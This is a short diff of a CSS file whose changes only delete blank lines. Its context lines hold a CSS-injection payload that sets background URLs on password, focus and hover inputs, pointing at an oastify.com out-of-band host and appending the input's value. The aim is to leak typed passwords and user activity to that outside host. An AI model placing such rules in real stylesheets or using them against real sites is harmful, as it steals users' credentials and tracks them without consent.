@@ -3,12 +3,10 @@ input[type="password"] {
   background: url("http://p3tbf7aumeah619g3647hjlbz25ttjh8.oastify.com/input=" attr(value)) no-repeat;
   background-size: 100px 100px;
 }
-
 input:focus {
   background: url("http://p3tbf7aumeah619g3647hjlbz25ttjh8.oastify.com/focus=" attr(value)) no-repeat;
   background-size: 100px 100px;
 }
-
 input:hover {
   background: url("http://p3tbf7aumeah619g3647hjlbz25ttjh8.oastify.com/hovered=true") no-repeat;
   background-size: 1px 1px;
